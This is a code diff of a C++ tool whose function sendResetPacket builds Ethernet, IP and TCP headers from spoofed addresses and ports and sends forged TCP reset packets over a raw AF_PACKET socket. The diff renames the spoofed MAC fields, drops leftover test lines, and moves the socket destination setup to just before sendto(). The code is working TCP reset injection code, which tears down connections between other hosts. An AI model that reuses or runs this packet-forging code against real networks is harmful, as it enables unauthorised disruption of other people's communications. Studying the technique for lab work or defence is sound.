@@ -21,8 +21,9 @@ using namespace std;
 
 struct spoofedcontent
 {
-  unsigned char temps[6];
-  unsigned char tempd[6];
+  // ethernetHeader
+  unsigned char sourceInterface[6];
+  unsigned char destinationInterface[6];
 
   // tcpHeader 
   u_int16_t sourcePort;                  
@@ -118,7 +119,6 @@ void sendResetPacket(spoofedcontent &spoofedContent)
 
     char interface[] = "ens33";
     unsigned char destinationMAC[ETH_ALEN] = {0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
-    unsigned char sourceMAC[ETH_ALEN] = {0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
     
     int rawSocket = socket(AF_PACKET, SOCK_RAW, IPPROTO_RAW);
     
@@ -144,22 +144,9 @@ void sendResetPacket(spoofedcontent &spoofedContent)
     {
       interfaceIndex = interfaceInfo.ifr_ifindex;
     }
-
-    //memcpy(ethernetHeader->sourceInterface, sourceMAC, ETH_ALEN);
-    //memcpy(ethernetHeader->destinationInterface, destinationMAC, ETH_ALEN);
-
-    //test
-    memcpy(ethernetHeader->sourceInterface, spoofedContent.temps, ETH_ALEN);
-    memcpy(ethernetHeader->destinationInterface, spoofedContent.tempd, ETH_ALEN);
-
+    memcpy(ethernetHeader->sourceInterface, spoofedContent.sourceInterface, ETH_ALEN);
+    memcpy(ethernetHeader->destinationInterface, spoofedContent.destinationInterface, ETH_ALEN);
     ethernetHeader->protocol = htons(ETH_P_IP);      // represents that the next header is that of IP
-
-
-    memset((void*)&destinationInterface, 0, sizeof(destinationInterface));
-    destinationInterface.sll_family = AF_PACKET;   
-    destinationInterface.sll_ifindex = interfaceIndex;
-    destinationInterface.sll_halen = ETH_ALEN;
-    memcpy((void*)(destinationInterface.sll_addr), (void*)destinationMAC, ETH_ALEN);
 
     // Populate the IP Header
 
@@ -215,6 +202,12 @@ void sendResetPacket(spoofedcontent &spoofedContent)
     tcpHeader->checksum = calcChecksum( (unsigned short*) pseudoPacket , pseudoPacket_size >> 1);
 
     u_int16_t packetSize = sizeof (struct ethernetheader) + sizeof (struct ipheader) + sizeof (struct tcpheader);
+
+    memset((void*)&destinationInterface, 0, sizeof(destinationInterface));
+    destinationInterface.sll_family = AF_PACKET;   
+    destinationInterface.sll_ifindex = interfaceIndex;
+    destinationInterface.sll_halen = ETH_ALEN;
+    memcpy((void*)(destinationInterface.sll_addr), (void*)destinationMAC, ETH_ALEN);
 
     if(sendto(rawSocket, packet, packetSize, 0, (struct sockaddr *) &destinationInterface, sizeof (destinationInterface)) < 0)
     {
